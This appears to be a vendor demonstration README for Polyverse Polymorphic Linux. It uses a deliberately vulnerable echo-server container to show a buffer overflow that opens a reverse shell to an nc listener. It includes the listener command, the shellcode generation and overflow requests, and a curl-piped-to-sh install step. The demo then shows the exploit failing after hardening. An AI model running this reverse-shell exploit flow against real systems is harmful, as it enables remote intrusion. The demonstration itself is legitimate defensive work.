# Demonstration: Polyverse Polymorphic Linux
## Set up for a Reverse Shell
### (1) Start nc listening on port 5555 (Session-1)
    nc -kl 5555
## Run Server with Readhook
### (2) Start the container with an interactive shell (Session-2)
    docker run -it --rm -p 8080:8080 polyverse/readhook-node-echo-server /bin/sh
### (2) We'll need curl and wget later
    apk update && apk add curl wget ca-certificates && update-ca-certificates
### (2) Run the echo-server with readhook in front of libc
    LD_PRELOAD="/tmp/fullhook.so /tmp/basehook.so" node /src/echo-server.js
## Generate Shell-Code and Perform Exploit
### (3) Generate shell-code for the exploit (Session-3)
    export shellCode=$(curl localhost:8080/xyzzxMAKELOADdocker.for.mac.localhost:5555)
### (3) Send shell-code to the OVERFLOW for a reverse shell
    curl localhost:8080/$shellCode
### (1) Check that the overflow resulted in a remote shell
    ls && whoami && exit
## Install Polyverse Polymorphic Linux
### (2) Add Polyverse Polymorphic Linux
    curl https://repo.polyverse.io/install.sh | sh -s vZ2v3Bo4Kbnwj9pECrLsoGDDo
### (2) Update packages with Polymorphic Linux packages
    sed -n -i '/repo.polyverse.io/p' /etc/apk/repositories && apk upgrade --update-cache --available
## Test Polyverse Polymorphic Linux
### (2) Re-run the echo-server with (only) basehook.so
    LD_PRELOAD=/tmp/basehook.so node /src/echo-server.js
### (3) Try the shellCode with Polymorphic Linux
    curl localhost:8080/$shellCode
### (1) Confirm that nobody phoned-home to the listener
### (2) Confirm that the server terminated abnormally
